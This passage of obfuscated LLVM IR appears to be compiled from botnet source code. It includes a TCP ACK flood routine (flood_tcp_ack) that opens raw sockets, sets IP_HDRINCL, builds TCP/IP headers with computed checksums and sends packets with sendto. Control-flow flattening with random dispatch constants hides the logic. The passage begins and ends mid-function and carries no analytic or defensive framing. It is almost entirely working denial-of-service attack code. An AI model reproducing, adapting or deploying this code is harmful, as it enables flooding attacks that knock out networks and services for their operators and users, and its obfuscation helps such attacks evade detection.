  store i16 %350, i16* %352, align 2
  %353 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %354 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %353, i32 0, i32 0
  %355 = bitcast %union.anon* %354 to %struct.anon.0*
  %356 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %355, i32 0, i32 6
  store i16 0, i16* %356, align 4
  %357 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %358 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %359 = bitcast %struct.tcphdr* %358 to i8*
  %360 = call zeroext i16 @htons(i16 zeroext 20) #9
  %361 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %357, i8* %359, i16 zeroext %360, i32 20)
  %362 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %363 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %362, i32 0, i32 0
  %364 = bitcast %union.anon* %363 to %struct.anon.0*
  %365 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %364, i32 0, i32 6
  store i16 %361, i16* %365, align 4
  %366 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %366, align 4
  %367 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 0
  %369 = bitcast %union.anon* %368 to %struct.anon.0*
  %370 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %369, i32 0, i32 1
  %371 = load i16, i16* %370, align 2
  %372 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %371, i16* %372, align 2
  %373 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  %375 = load i32, i32* %374, align 4
  %376 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %377 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %376, i32 0, i32 0
  store i32 %375, i32* %377, align 4
  %378 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 0
  %380 = bitcast %union.anon* %379 to %struct.anon.0*
  %381 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %380, i32 0, i32 3
  %382 = load i32, i32* %381, align 4
  %383 = call i32 @ntohl(i32 %382) #9
  %384 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 0
  %386 = bitcast %union.anon* %385 to %struct.anon.0*
  %387 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %386, i32 0, i32 2
  %388 = load i32, i32* %387, align 4
  %389 = call i32 @ntohl(i32 %388) #9
  %390 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %383, i32 %389)
  %391 = load i32, i32* %8, align 4
  %392 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i32 0, i32 0
  %393 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %394 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  store %struct.sockaddr* %394, %struct.sockaddr** %393, align 8
  %395 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %396 = load %struct.sockaddr*, %struct.sockaddr** %395, align 8
  %397 = call i64 @sendto(i32 %391, i8* %392, i64 40, i32 16384, %struct.sockaddr* %396, i32 16)
  %398 = trunc i64 %397 to i32
  store i32 %398, i32* %22, align 4
  store i32 -1680526396, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = load i32, i32* %24, align 4
  %401 = add nsw i32 %400, 1
  store i32 %401, i32* %24, align 4
  store i32 620322089, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i32, i32* %22, align 4
  %404 = icmp eq i32 %403, -1
  %405 = select i1 %404, i32 0, i32 1
  store i32 %405, i32* %6, align 4
  store i32 1364518139, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i32, i32* %6, align 4
  ret i32 %407

loopEnd:                                          ; preds = %402, %399, %262, %251, %240, %233, %232, %221, %217, %216, %215, %201, %200, %first, %switchDefault
  br label %loopEntry
}

declare zeroext i16 @ip_header_checksum(i16*, i32) #6

declare zeroext i16 @tcp_udp_header_checksum(%struct.iphdr*, i8*, i16 zeroext, i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #6

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -611876307, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -611876307, label %6
    i32 1008732339, label %10
    i32 -996079468, label %17
    i32 -1592047283, label %20
    i32 -1348414032, label %24
    i32 1123290653, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 1008732339, i32 -1592047283
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 -996079468, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 -611876307, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 -1348414032, i32 1123290653
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 1123290653, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 -1824240056, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1824240056, label %23
    i32 276124441, label %27
    i32 -379131966, label %37
    i32 -823257811, label %41
    i32 -1867027613, label %48
    i32 1874140004, label %79
    i32 444663573, label %84
    i32 -2106451686, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 276124441, i32 -379131966
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 -1824240056, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 -823257811, i32 -1867027613
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 -1867027613, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #9
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 1874140004, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 444663573, i32 -2106451686
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 1874140004, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

declare i32 @printf(i8*, ...) #6

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #6

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_ack(%struct.arguments*) #0 {
  %.reg2mem = alloca i8**
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 1)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 0)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  store i8** %168, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 1803152588, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1803152588, label %first
    i32 420615107, label %171
    i32 532139164, label %172
    i32 2096579557, label %182
    i32 -109509393, label %183
    i32 1357273157, label %184
    i32 2014064317, label %192
    i32 -229264671, label %205
    i32 775769411, label %208
    i32 -118910190, label %218
    i32 -1430446875, label %221
    i32 -1998630921, label %225
    i32 -763972628, label %244
    i32 811831845, label %261
    i32 194644908, label %264
    i32 81415637, label %432
    i32 -1593569775, label %435
    i32 -75550381, label %436
    i32 -1864056764, label %437
    i32 -1287644358, label %445
    i32 -565011912, label %466
    i32 258332081, label %486
    i32 -406490723, label %492
    i32 1225818031, label %496
    i32 -1569554111, label %503
    i32 1654936832, label %509
    i32 -495722460, label %518
    i32 179436, label %526
    i32 -1589501091, label %535
    i32 -1043821957, label %543
    i32 1668303841, label %551
    i32 -1746486387, label %558
    i32 489795383, label %566
    i32 84790687, label %573
    i32 467889836, label %632
    i32 -1746399963, label %635
    i32 -1241252406, label %636
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %169 = icmp ne i8** %.reload, null
  %170 = select i1 %169, i32 532139164, i32 420615107
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:172:                                    ; preds = %loopEntry
  %173 = load %struct.arguments*, %struct.arguments** %2, align 8
  %174 = getelementptr inbounds %struct.arguments, %struct.arguments* %173, i32 0, i32 3
  %175 = load i8, i8* %174, align 1
  %176 = zext i8 %175 to i64
  %177 = call noalias i8* @calloc(i64 %176, i64 4) #8
  %178 = bitcast i8* %177 to i32*
  store i32* %178, i32** %22, align 8
  %179 = load i32*, i32** %22, align 8
  %180 = icmp ne i32* %179, null
  %181 = select i1 %180, i32 -109509393, i32 2096579557
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:183:                                    ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1357273157, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %3, align 4
  %186 = load %struct.arguments*, %struct.arguments** %2, align 8
  %187 = getelementptr inbounds %struct.arguments, %struct.arguments* %186, i32 0, i32 3
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %185, %189
  %191 = select i1 %190, i32 2014064317, i32 -1593569775
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %194 = load i32*, i32** %22, align 8
  %195 = load i32, i32* %3, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds i32, i32* %194, i64 %196
  store i32 %193, i32* %197, align 4
  %198 = load i32*, i32** %22, align 8
  %199 = load i32, i32* %3, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i32, i32* %198, i64 %200
  %202 = load i32, i32* %201, align 4
  %203 = icmp eq i32 %202, -1
  %204 = select i1 %203, i32 -229264671, i32 775769411
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8**, i8*** %9, align 8
  %207 = bitcast i8** %206 to i8*
  call void @free(i8* %207) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:208:                                    ; preds = %loopEntry
  store i32 1, i32* %4, align 4
  %209 = load i32*, i32** %22, align 8
  %210 = load i32, i32* %3, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i32, i32* %209, i64 %211
  %213 = load i32, i32* %212, align 4
  %214 = bitcast i32* %4 to i8*
  %215 = call i32 @setsockopt(i32 %213, i32 0, i32 3, i8* %214, i32 4) #8
  %216 = icmp eq i32 %215, -1
  %217 = select i1 %216, i32 -118910190, i32 -1430446875
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8**, i8*** %9, align 8
  %220 = bitcast i8** %219 to i8*
  call void @free(i8* %220) #8
  call void @exit(i32 1) #10
  unreachable

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %23, align 4
  %223 = icmp ne i32 %222, 0
